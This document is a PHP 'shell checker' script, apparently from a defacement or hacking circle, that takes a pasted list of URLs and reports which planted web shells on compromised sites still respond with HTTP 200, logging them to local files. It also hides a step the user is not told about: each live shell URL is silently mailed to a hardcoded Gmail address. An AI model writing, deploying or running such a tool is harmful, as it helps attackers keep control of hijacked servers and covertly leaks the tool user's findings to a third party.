<?php 

echo "<style type=\"text/css\">
.entryfield {width:600px;height:200px;}
.subbtn {background:#b70505;color:white;border: 1px solid #000; padding:6px 6px 6px 6px;}
.subbtn:hover {background:#c0bfbf;color:#000000;}
</style>
<center>
<font face='Courier'>
<font color='white'><h2>Pasirmerah shell Checker</h2></font>
<body bgcolor='black'>
<form name=\"frmcontadd\" action=\"\" method=\"post\">

  <textarea class=\"entryfield\" name=\"url\" cols=115 rows=10></textarea><br>
  <br>
  <input class=\"subbtn\" type=\"submit\" name=\"Submit\" value=\"Gelot cok!\">

</form>";
function get_http_response_code($theurl) {
    $headers = get_headers($theurl);
    $status = substr($headers[0], 9, 3);
    $p = parse_url($theurl);
    $host = explode(':', $p['host']);
    $hostname = $host[0];
    if ($status == 200) {
        $visitor = $_SERVER["REMOTE_ADDRS"];
        $judul = "shell: $theurl ";
        $body = "shell: $theurl";
        if (!empty($theurl)) {
            @mail("yukinoshita47@gmail.com", $judul, $body); // <-- Ini Dikirim Ke Email
        }
        $writeuRl = $theurl . "
";
        $fh = fopen("hasil.txt", "a");
        fwrite($fh, $writeuRl, strlen($writeuRl));
        echo "<strong><font color=Green>Nemu Cok </font></strong> - <a href=\"" . $theurl . "\" target=_blank>" . $theurl . "</a><br />";
    } elseif ($status == 500) {
        echo "<strong><font color=black>" . $status . " 500 Internal Server Error Cok !</font></strong> - <a href=\"" . $theurl . "\" target=_blank>" . $theurl . "</a><br />";
    } else {
        $writeuRl = $theurl . "
";
        $fh = fopen("sampah.txt", "a");
        fwrite($fh, $writeuRl, strlen($writeuRl));
        echo "<strong><font color=red>Ora Nemu Cok </font></strong> - <a href=\"" . $theurl . "\" target=_blank>" . $theurl . "</a><br />";
    }
}
if (isset($_POST['Submit'])) {
    $hosts = explode("
", $_POST['url']);
   
    $values = array();
    foreach ($hosts as $host) {
        if ($host != "") {
            @get_http_response_code("$host");
        }
    }
    echo "<br /><strong>Finish Cok</strong>";
}
?>
	
